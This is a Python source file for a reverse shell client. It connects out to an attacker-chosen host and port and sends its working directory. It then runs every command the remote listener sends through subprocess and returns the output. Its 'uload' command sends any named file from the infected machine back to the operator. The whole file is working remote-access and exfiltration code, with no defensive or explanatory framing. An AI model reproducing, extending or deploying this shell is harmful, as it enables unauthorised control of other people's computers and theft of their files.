import socket
import os
import subprocess
import argparse
import tqdm

# ANSI COLOR CODES
# ================
class tcolors:
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
# ARGUMENT FLAGS
# ============== 
parser = argparse.ArgumentParser()
parser.add_argument("-l", dest="Host", help="set the host")
parser.add_argument("-p", dest="Port", default=4444, help="set the port")
#parser.add_argument("-p", dest="BS", default=320, help="set the buffer size")
args = parser.parse_args()
if args.Host == None:
    print(tcolors.WARNING + "[!] Warning: Please provide an host ip address." + tcolors.ENDC)
    print("[#]" + tcolors.BOLD + " Use '-h' to check help" + tcolors.ENDC)
    exit()
args.Port = int(args.Port) #Port must be of type<'int'>

S_HOST = args.Host
S_PORT = args.Port
BUFFER_SIZE = 1024 * 320 #Size of Buffer-> 320KB
SEPERATOR = "<sep>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((S_HOST, S_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    cmd = s.recv(BUFFER_SIZE).decode()
    splited_cmd = cmd.split()
    if cmd.lower() == "exit":
        break
    if splited_cmd[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_cmd[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    if splited_cmd[0].lower() == "uload":
        try:
            if splited_cmd[1] == "none":
                print(tcolors.WARNING + "[!] Warning: Please enter the path of a file" + tcolors.ENDC)
                continue
            else:
                trigger = "uload"
                s.send(trigger.encode())
                filename = splited_cmd[1]
                filesize = os.path.getsize(filename)
                s.send(f"{filename}{SEPERATOR}{filesize}".encode())

                # START SENDING..
                # ===============
                progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, "rb") as f:
                    while True:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        s.sendall(bytes_read)
                        progress.update(len(bytes_read))
                continue
        except FileNotFoundError as e:
            output = str(e)
        # else:
        #     print(tcolors.FAIL + f"[-] Some went wrong !!" + tcolors.ENDC)

    else:
        output = subprocess.getoutput(cmd)

    cwd = os.getcwd()
    message = f"{output}{SEPERATOR}{cwd}"
    s.send(message.encode())

s.close()